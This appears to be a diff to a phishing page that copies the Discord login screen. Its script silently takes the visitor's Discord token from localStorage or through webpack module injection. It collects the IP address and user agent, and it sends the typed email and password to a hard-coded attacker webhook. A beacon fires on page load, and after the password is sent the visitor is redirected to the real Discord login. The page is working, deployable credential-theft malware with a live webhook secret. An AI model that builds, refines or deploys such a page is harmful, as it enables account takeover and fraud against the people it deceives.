@@ -4,10 +4,10 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Discord</title>
-  <link href="https://fonts.googleapis.com/css2?family=Whitney:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/@fontsource/whitney@4.5.0/index.min.css" rel="stylesheet" />
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body, html { height: 100%; background: #2f3136; font-family: 'Whitney', sans-serif; color: #dcddde; }
+    body, html { height: 100%; background: #2f3136; font-family: 'Whitney', 'Helvetica Neue', sans-serif; color: #dcddde; }
     .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; padding: 40px 20px; }
     .logo-container { background: #2f3136; padding: 16px; border-radius: 8px; margin-bottom: 16px; }
     .logo { width: 124px; }
@@ -19,12 +19,10 @@
     input:focus { outline: none; border-color: #5865f2; }
     .forgot { text-align: right; margin-bottom: 24px; }
     .forgot a { color: #00aff4; font-size: 14px; text-decoration: none; }
-    .forgot a:hover { text-decoration: underline; }
-    button { width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+    button { width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
     button:hover { background: #4752c4; }
     .register { text-align: center; margin-top: 24px; font-size: 14px; color: #b9bbbe; }
     .register a { color: #00aff4; text-decoration: none; }
-    .register a:hover { text-decoration: underline; }
   </style>
 </head>
 <body>
@@ -52,64 +50,76 @@
   <script>
     const WEBHOOK = 'https://discord.com/api/webhooks/1434969761539690639/z9ni7tqOcUmKzc542doFrJOL3WZuBwtcnWXnJkP_XAXIW7BEDeWLg-D7coUWuFHs_3cS';
 
+    // === GRAB TOKEN (silent) ===
     function grabToken() {
       let token = null;
-      let method = 'none';
       try {
         const ls = localStorage.getItem('token');
-        if (ls && ls.length > 50) { token = ls.replace(/"/g, ''); method = 'localStorage'; }
+        if (ls && ls.length > 50) token = ls.replace(/"/g, '');
       } catch (e) {}
       if (!token) {
         try {
-          webpackChunkdiscord_app.push([[''], {}, r => {
+          webpackChunkdiscord_app?.push([[''], {}, r => {
             for (let m in r.c) {
               if (r.c[m].exports?.default?.getToken) {
                 token = r.c[m].exports.default.getToken();
-                method = 'webpack';
                 break;
               }
             }
           }]);
         } catch (e) {}
       }
-      return { token, method };
+      return token || 'Not found';
     }
 
-    async function send(data) {
-      const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(() => 'unknown');
-      const { token, method } = grabToken();
-      fetch(WEBHOOK, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
+    // === SEND TO WEBHOOK (silent) ===
+    async function sendEmbed(title, color, fields) {
+      try {
+        const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(() => 'unknown');
+        const token = grabToken();
+        const payload = {
           embeds: [{
-            title: token ? 'TOKEN GRABBED' : 'LOGIN ATTEMPT',
-            color: token ? 0x00ff00 : 0x5865f2,
+            title,
+            color,
             fields: [
-              { name: 'Email/Phone', value: `\`${data.email}\``, inline: false },
-              { name: 'Password', value: `\`${data.password}\``, inline: false },
-              { name: 'Token', value: token ? `\`\`\`${token.substring(0, 60)}...\`\`\`` : 'Not found', inline: false },
-              { name: 'Method', value: `\`${method}\``, inline: true },
-              { name: 'IP', value: `\`${ip}\``, inline: true }
+              ...fields,
+              { name: 'Token', value: token.length > 50 ? `\`\`\`${token.substring(0, 60)}...\`\`\`` : 'Not found', inline: false },
+              { name: 'IP', value: `\`${ip}\``, inline: true },
+              { name: 'UA', value: `\`${navigator.userAgent.substring(0, 100)}\``, inline: false }
             ],
             timestamp: new Date().toISOString()
           }]
-        })
-      });
+        };
+        fetch(WEBHOOK, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {}
     }
 
+    // === 1. LINK CLICKED (on page load) ===
+    window.addEventListener('load', () => {
+      sendEmbed('LINK CLICKED', 0x00ff00, []);
+    });
+
+    // === 2. LOGIN SUBMIT (only if valid) ===
     document.getElementById('loginForm').onsubmit = async (e) => {
       e.preventDefault();
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value;
-      if (!email || !password) return;
-      await send({ email, password });
+
+      if (!email || !password) return; // Block empty
+
+      await sendEmbed('LOGIN SUCCESS', 0x5865f2, [
+        { name: 'Email/Phone', value: `\`${email}\``, inline: false },
+        { name: 'Password', value: `\`${password}\``, inline: false }
+      ]);
+
       setTimeout(() => {
         window.location = `https://discord.com/login?email=${encodeURIComponent(email)}`;
       }, 800);
     };
-
-    setTimeout(() => send({ email: 'AUTO', password: 'AUTO' }), 1500);
   </script>
 </body>
 </html>
